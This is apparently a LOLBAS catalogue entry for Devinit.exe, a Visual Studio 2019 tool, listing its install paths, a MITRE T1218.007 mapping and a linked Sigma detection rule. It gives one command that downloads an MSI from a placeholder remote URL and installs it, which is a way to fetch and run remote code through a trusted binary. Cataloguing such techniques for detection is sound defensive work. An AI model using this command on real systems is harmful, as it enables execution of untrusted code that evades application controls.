---
Acknowledgement:
- Person: mr.
Author: mr.d0x
Commands:
- Category: Execute
  Command: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
  Description: Downloads an MSI file to C:\Windows\Installer and then installs it.
  MitreID: T1218.007
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: MSI
  - Execute: Remote
  Usecase: Executes code from a (remote) MSI file.
Created: 2022-01-20
Description: Visual Studio 2019 tool
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml
Full_Path:
- Path: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe
- Path: C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe
Name: Devinit.exe
Resources:
- Link: https://twitter.com/mrd0x/status/1460815932402679809
mitre_data:
  technique_ids:
  - T1218.007
tags:
- lolbas/othermsbinaries
---

# Devinit.exe

Visual Studio 2019 tool

# Path(s)

- `C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe`
- `C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe`

# Execute Commands

Downloads an MSI file to C:\Windows\Installer and then installs it.

```batch
devinit.exe run -t msi-install -i {REMOTEURL:.msi}
```

- **Usecase:** Executes code from a (remote) MSI file.
- **Privileges Required:** User
- **MitreID:** `T1218.007`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/mrd0x/status/1460815932402679809
# Acknowledgements

- mr.d0x (Authored, 2022-01-20)
- mr.